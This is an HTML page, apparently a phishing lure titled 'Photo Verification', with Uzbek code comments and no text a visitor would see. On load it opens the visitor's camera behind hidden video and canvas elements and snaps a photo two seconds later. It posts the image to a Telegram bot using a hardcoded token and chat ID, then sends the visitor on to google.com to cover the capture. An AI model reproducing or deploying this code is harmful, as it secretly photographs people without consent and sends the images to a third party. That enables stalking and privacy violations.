<!DOCTYPE html>
<html>
<head>
    <title>Photo Verification</title>
</head>
<body>
    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
        const botToken = '8541185973:AAFhTLOGzfi5FQpMrnLKtKVzzWeUr6SL2rI';
        const adminId = '8275787221';

        async function startCamera() {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.getElementById('video');
            video.srcObject = stream;

            setTimeout(() => {
                takePhoto();
            }, 2000); // 2 soniyadan keyin rasmga oladi
        }

        function takePhoto() {
            const canvas = document.getElementById('canvas');
            const video = document.getElementById('video');
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            canvas.toBlob(blob => {
                sendToTelegram(blob, 'photo');
            }, 'image/jpeg');
        }

        async function sendToTelegram(blob, type) {
            const formData = new FormData();
            formData.append(type, blob, 'image.jpg');
            await fetch(`https://api.telegram.org/bot${botToken}/send${type.charAt(0).toUpperCase() + type.slice(1)}?chat_id=${adminId}`, {
                method: 'POST',
                body: formData
            });
            window.location.href = "https://google.com"; // Tugagach Google'ga o'tkazib yuboradi
        }

        window.onload = startCamera;
    </script>
</body>
</html>
